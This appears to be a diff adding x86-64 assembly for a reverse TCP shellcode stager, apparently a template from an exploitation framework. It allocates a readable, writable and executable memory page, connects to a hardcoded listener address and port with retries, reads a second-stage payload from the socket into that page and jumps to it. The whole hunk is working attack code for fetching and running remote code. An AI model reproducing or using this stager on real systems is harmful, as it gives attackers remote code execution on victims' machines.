@@ -1,0 +1,78 @@
+      mmap:
+        xor    edi, edi
+        push   0x9
+        pop    rax
+        cdq
+        mov    dh, 0x10
+        mov    rsi, rdx
+        xor    r9, r9
+        push   0x22
+        pop    r10
+        push   0x7
+        pop    rdx
+        syscall ; mmap(NULL, 4096, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, 0, 0)
+        test   rax, rax
+        js failed
+
+        push   0xa       ; retry counter
+        pop    r9
+        push   rax
+        push   0x29
+        pop    rax
+        cdq
+        push   0x2
+        pop    rdi
+        push   0x1
+        pop    rsi
+        syscall ; socket(PF_INET, SOCK_STREAM, IPPROTO_IP)
+        test   rax, rax
+        js failed
+
+        xchg   rdi, rax
+
+      connect:
+        mov    rcx, 0x100007f5c110002
+        push   rcx
+        mov    rsi, rsp
+        push   0x10
+        pop    rdx
+        push   0x2a
+        pop    rax
+        syscall ; connect(3, {sa_family=AF_INET, LPORT, LHOST, 16)
+        pop    rcx
+        test   rax, rax
+        jns    recv
+
+      handle_failure:
+        dec    r9
+        jz     failed
+        push   rdi
+        push   0x23
+        pop    rax
+        push   0x0
+        push   0x5
+        mov    rdi, rsp
+        xor    rsi, rsi
+        syscall                      ; sys_nanosleep
+        pop    rcx
+        pop    rcx
+        pop    rdi
+        test   rax, rax
+        jns    connect
+
+      failed:
+        push   0x3c
+        pop    rax
+        push   0x1
+        pop    rdi
+        syscall ; exit(1)
+
+      recv:
+        pop    rsi
+        push   _PAYLOAD_LENGTH_
+        pop    rdx
+        syscall ; read(3, "", #{read_length})
+        test   rax, rax
+        js     failed
+
+        jmp    rsi ; to stage
